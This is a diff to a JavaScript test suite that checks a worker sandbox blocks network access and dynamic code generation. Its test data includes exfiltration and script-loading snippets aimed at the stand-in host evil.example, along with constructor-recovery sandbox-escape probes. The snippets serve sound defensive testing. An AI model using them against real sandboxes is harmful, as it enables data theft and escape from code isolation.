@@ -143,39 +143,70 @@ describe('rejectsDynamicImport', () => {
 });
 
 describe('applyWorkerHardening (behavioral, vm-backed)', () => {
+  // NOTE: network stand-ins RECORD calls instead of throwing: a fake that
+  // merely lacks fetch would pass even with hardening deleted. Every
+  // attack test below would transmit if the guard regresses.
   function workerLikeGlobal() {
-    const network = () => {
-      throw new Error('network must be unreachable');
+    const calls = [];
+    const network = (...args) => {
+      calls.push(args);
+      return Promise.resolve('NETWORK-REACHED');
     };
     const proto = {};
     Object.defineProperty(proto, 'fetch', { get: () => network, configurable: true });
     proto.WebSocket = function WebSocket() {
-      throw new Error('network must be unreachable');
+      calls.push(['WebSocket']);
     };
     proto.XMLHttpRequest = function XMLHttpRequest() {
-      throw new Error('network must be unreachable');
+      calls.push(['XHR']);
     };
     proto.eval = (x) => x;
+    const navProto = {
+      get sendBeacon() {
+        return () => {
+          calls.push(['sendBeacon']);
+          return true;
+        };
+      },
+    };
     const scope = Object.create(proto);
     scope.Function = function Function() {
-      throw new Error('no string constructor');
+      calls.push(['Function']);
     };
     scope.importScripts = () => {
-      throw new Error('no script loading');
+      calls.push(['importScripts']);
     };
     scope.WebAssembly = {};
     scope.Worker = function Worker() {};
-    scope.navigator = {
-      sendBeacon: () => true,
-      serviceWorker: {},
-      locks: {},
-      storage: {},
-      clipboard: {},
+    scope.WebTransport = function WebTransport() {
+      calls.push(['WebTransport']);
     };
+    scope.RTCPeerConnection = function RTCPeerConnection() {
+      calls.push(['RTC']);
+    };
+    scope.MessageChannel = function MessageChannel() {
+      calls.push(['MessageChannel']);
+    };
+    scope.navigator = Object.create(navProto, {
+      sendBeacon: {
+        value: () => {
+          calls.push(['sendBeacon']);
+          return true;
+        },
+        configurable: true,
+        writable: true,
+      },
+      serviceWorker: { value: {}, configurable: true, writable: true },
+      locks: { value: {}, configurable: true, writable: true },
+      storage: { value: {}, configurable: true, writable: true },
+      clipboard: { value: {}, configurable: true, writable: true },
+      mediaDevices: { value: {}, configurable: true, writable: true },
+    });
     scope.console = { log() {}, error() {}, warn() {} };
     scope.postMessage = () => {};
     scope.self = scope;
-    return { scope, proto };
+    scope.setTimeout = (fn) => fn;
+    return { scope, proto, calls };
   }
 
   it('neutralizes own, proto-chain, and navigator APIs', () => {
@@ -192,15 +223,20 @@ describe('applyWorkerHardening (behavioral, vm-backed)', () => {
     assert.equal(scope.importScripts, undefined);
     assert.equal(scope.WebAssembly, undefined);
     assert.equal(scope.Worker, undefined);
+    assert.equal(scope.WebTransport, undefined);
+    assert.equal(scope.RTCPeerConnection, undefined);
+    assert.equal(scope.MessageChannel, undefined);
     assert.equal(scope.navigator.sendBeacon, undefined);
+    assert.equal(Object.getPrototypeOf(scope.navigator).sendBeacon, undefined);
     assert.equal(scope.navigator.serviceWorker, undefined);
     assert.equal(scope.navigator.locks, undefined);
     assert.equal(scope.navigator.storage, undefined);
     assert.equal(scope.navigator.clipboard, undefined);
+    assert.equal(scope.navigator.mediaDevices, undefined);
   });
 
   it('attack snippets throw inside a hardened context', () => {
-    const { scope } = workerLikeGlobal();
+    const { scope, calls } = workerLikeGlobal();
     applyWorkerHardening(scope);
     const ctx = vm.createContext(scope);
     // NOTE: vm-realm errors fail cross-realm `instanceof`, so assert on
@@ -225,10 +261,29 @@ describe('applyWorkerHardening (behavioral, vm-backed)', () => {
       'new WebSocket("wss://evil.example/x")',
       'new XMLHttpRequest()',
       'navigator.sendBeacon("/x")',
+      'Object.getPrototypeOf(navigator).sendBeacon("/x")',
       'importScripts("https://evil.example/x.js")',
+      'new WebTransport("https://evil.example/x")',
+      'new RTCPeerConnection()',
+      'new MessageChannel()',
     ]) {
       throwsNamed(() => vm.runInContext(snippet, ctx), snippet);
     }
+    assert.deepEqual(calls, [], 'no network stand-in may have been reached');
+  });
+
+  it('constructor recovery paths are closed', () => {
+    const { scope } = workerLikeGlobal();
+    const ctx = vm.createContext(scope);
+    // Harden INSIDE the context: constructor prototypes are per-realm
+    // intrinsics, so (like the real worker bootstrap) the neutering must
+    // run in the realm being hardened, not the host realm.
+    vm.runInContext(`(${applyWorkerHardening.toString()})(self)`, ctx);
+    assert.equal(vm.runInContext('typeof (function(){}).constructor', ctx), 'undefined');
+    assert.equal(vm.runInContext('typeof (async()=>{}).constructor', ctx), 'undefined');
+    assert.equal(vm.runInContext('typeof (function*(){}).constructor', ctx), 'undefined');
+    assert.equal(vm.runInContext('typeof Function', ctx), 'undefined');
+    assert.equal(vm.runInContext('typeof eval', ctx), 'undefined');
   });
 
   it('legitimate code keeps working in a hardened context', () => {
@@ -239,7 +294,9 @@ describe('applyWorkerHardening (behavioral, vm-backed)', () => {
     assert.equal(vm.runInContext('Math.max(1, 2)', ctx), 2);
     assert.deepEqual([...vm.runInContext('Object.keys({ a: 1 })', ctx)], ['a']);
     assert.equal(vm.runInContext('JSON.stringify({ a: 1 })', ctx), '{"a":1}');
-    assert.equal(vm.runInContext('typeof setTimeout', ctx), 'undefined');
+    // Timers survive hardening (bounded by the host-side timeout instead).
+    assert.equal(vm.runInContext('typeof setTimeout', ctx), 'function');
+    assert.equal(vm.runInContext('x => x * 2', ctx)(21), 42);
   });
 
   it('the shipped worker source behaves end-to-end in a fake worker global', async () => {
@@ -260,8 +317,19 @@ describe('applyWorkerHardening (behavioral, vm-backed)', () => {
   });
 
   it('the shipped worker source turns network attacks into errors, not sends', async () => {
+    // The fake global offers WORKING network: the error below proves the
+    // shipped hardening blocked it (not that the API was merely absent).
+    const netCalls = [];
     const posted = [];
     const scope = {
+      fetch: (...args) => {
+        netCalls.push(args);
+        return Promise.resolve('NETWORK-REACHED');
+      },
+      WebSocket: function WebSocket() {
+        netCalls.push(['WebSocket']);
+      },
+      navigator: { sendBeacon: () => netCalls.push(['sendBeacon']) },
       console: { log() {}, error() {}, warn() {} },
       postMessage: (msg) => {
         posted.push(msg);
@@ -274,6 +342,52 @@ describe('applyWorkerHardening (behavioral, vm-backed)', () => {
     assert.equal(posted.length, 1);
     assert.equal(posted[0].ok, false);
     assert.ok(/Error:/.test(posted[0].output));
+    assert.deepEqual(netCalls, [], 'no network stand-in may have been reached');
+  });
+
+  it('runner internals are invisible to user code in the shipped source', async () => {
+    const posted = [];
+    const scope = {
+      console: { log() {}, error() {}, warn() {} },
+      postMessage: (msg) => {
+        posted.push(msg);
+      },
+    };
+    scope.self = scope;
+    const ctx = vm.createContext(scope);
+    vm.runInContext(buildWorkerSource('1'), ctx);
+    assert.equal(vm.runInContext('typeof __AsyncFunction', ctx), 'undefined');
+    assert.equal(vm.runInContext('typeof __USER_CODE', ctx), 'undefined');
+    assert.equal(vm.runInContext('typeof __logs', ctx), 'undefined');
+  });
+
+  it('constructor recovery yields nothing usable in shipped source', async () => {
+    const posted = [];
+    const scope = {
+      console: { log() {}, error() {}, warn() {} },
+      postMessage: (msg) => {
+        posted.push(msg);
+      },
+    };
+    scope.self = scope;
+    const ctx = vm.createContext(scope);
+    // No literal import( anywhere, so the scanner passes; the run must
+    // still succeed with every codegen path neutered to undefined.
+    vm.runInContext(
+      buildWorkerSource(
+        'const c1 = (function(){}).constructor; ' +
+          'const c2 = (async()=>{}).constructor; ' +
+          'const c3 = (function*(){}).constructor; ' +
+          'if (typeof c1 !== "undefined" || typeof c2 !== "undefined" || typeof c3 !== "undefined") ' +
+          '{ throw new Error("constructor leaked"); } ' +
+          'console.log("constructors closed");',
+      ),
+      ctx,
+    );
+    await scope.onmessage({ data: {} });
+    assert.equal(posted.length, 1);
+    assert.equal(posted[0].ok, true);
+    assert.equal(posted[0].output, 'constructors closed');
   });
 });
 
@@ -337,5 +451,39 @@ describe('runUserCode', () => {
 
   it('exports a sane positive default timeout', () => {
     assert.ok(Number.isFinite(RUN_TIMEOUT_MS) && RUN_TIMEOUT_MS > 0);
+  });
+
+  it('clamps degenerate timeouts to the default instead of hanging', async () => {
+    for (const timeout of [Infinity, NaN, 0, -5]) {
+      const fake = fakeWorkerFactory(() => {
+        // Never responds; a clamped timeout must still fire.
+      });
+      await assert.rejects(
+        runUserCode('while(true){}', { timeout, createWorker: fake.createWorker }),
+        new RegExp(`timed out after ${RUN_TIMEOUT_MS} ms`),
+      );
+      assert.equal(fake.calls.terminate, 1);
+    }
+  });
+
+  it('terminates the worker even without a cleanup callback', async () => {
+    let terminated = 0;
+    const handlers = {};
+    const worker = {
+      postMessage: () => {},
+      terminate: () => {
+        terminated += 1;
+      },
+      addEventListener: (type, fn) => {
+        handlers[type] = fn;
+      },
+      removeEventListener: () => {},
+    };
+    const pending = runUserCode('while(true){}', {
+      timeout: 20,
+      createWorker: () => ({ worker }),
+    });
+    await assert.rejects(pending, /timed out/);
+    assert.equal(terminated, 1);
   });
 });
